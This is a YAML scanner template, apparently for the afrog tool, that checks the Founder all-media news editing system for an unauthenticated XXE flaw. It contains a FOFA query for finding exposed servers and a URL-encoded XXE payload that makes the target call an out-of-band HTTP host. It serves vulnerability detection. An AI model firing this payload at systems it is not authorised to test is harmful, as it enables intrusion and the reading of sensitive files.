id: founder-add-or-update-org-xxe

info:
  name: 方正畅享全媒体新闻采编系统addOrUpdateOrg存在XXE漏洞
  author: zan8in
  severity: critical
  verified: false
  description: |-
    方正畅享全媒体新闻采编系统addOrUpdateOrg存在XXE漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。
    fofa: app="FOUNDER-全媒体采编系统"
  tags: xxe,方正,方正畅享全媒体采编系统
  created: 2025/03/10

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /newsedit/api/orgUser/addOrUpdateOrg
      body: |
        xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{{oobHTTP}}%22%3E%20%25remote;%5D%3E
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
